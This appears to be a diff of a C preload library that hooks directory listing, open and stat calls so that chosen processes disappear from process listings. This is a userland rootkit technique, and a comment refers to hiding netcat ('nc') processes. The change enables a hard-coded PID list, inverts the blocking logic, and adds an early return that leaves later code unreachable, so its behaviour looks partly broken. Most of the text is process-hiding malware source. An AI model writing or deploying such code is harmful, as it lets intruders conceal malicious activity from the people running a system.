@@ -15,7 +15,7 @@ gcc -shared -fPIC mod.c -o mod.so
 #include <stdarg.h>
 #include <fcntl.h>
 
-// unsigned long blocked_pids[] = {102, 1001, 53, 896};
+unsigned long blocked_pids[] = {102, 1001, 53, 896};
 // #define DEBUG
 
 #define load_og_func(var, name) \
@@ -37,20 +37,20 @@ typedef struct stat stat_t;
 typedef struct statx statx_t;
 
 // References to original functions
-static DIR *(*og_opendir)(const char *dirname);
-static struct dirent *(*og_readdir)(DIR *dir);
-static struct dirent64 *(*og_readdir64)(DIR *dir);
-static int (*og_open)(const char *pathname, int flags, ...);
-static int (*og_openat)(int dirfd, const char *pathname, int flags, ...);
-static int (*og_stat)(const char *restrict path, stat_t *restrict statbuf);
-static int (*og_statx)(int dirfd, const char *restrict path, int flags, unsigned int mask, statx_t *restrict statxbuf);
+DIR *(*og_opendir)(const char *dirname);
+struct dirent *(*og_readdir)(DIR *dir);
+struct dirent64 *(*og_readdir64)(DIR *dir);
+int (*og_open)(const char *pathname, int flags, ...);
+int (*og_openat)(int dirfd, const char *pathname, int flags, ...);
+int (*og_stat)(const char *restrict path, stat_t *restrict statbuf);
+int (*og_statx)(int dirfd, const char *restrict path, int flags, unsigned int mask, statx_t *restrict statxbuf);
 
 bool is_blocked_pid(unsigned long pid){
-    // for(size_t i = 0; i < sizeof(blocked_pids)/sizeof(blocked_pids[0]); i++){
-    //     if(pid == blocked_pids[i])
-    //         return true;
-    // }
-    // return false;
+    for(size_t i = 0; i < sizeof(blocked_pids)/sizeof(blocked_pids[0]); i++){
+         if(pid == blocked_pids[i])
+             return false;
+     }
+     return true;
 
     // Get command and check for nc
     char path[64];
@@ -281,7 +281,7 @@ struct dirent *readdir(DIR *d){
 
     errno = 0;
     unsigned long pid = strtoul(entry->d_name, NULL, 10);
-    if(errno)
+    if(errno || !pid)
         return entry;
 
     if(!is_blocked_pid(pid))
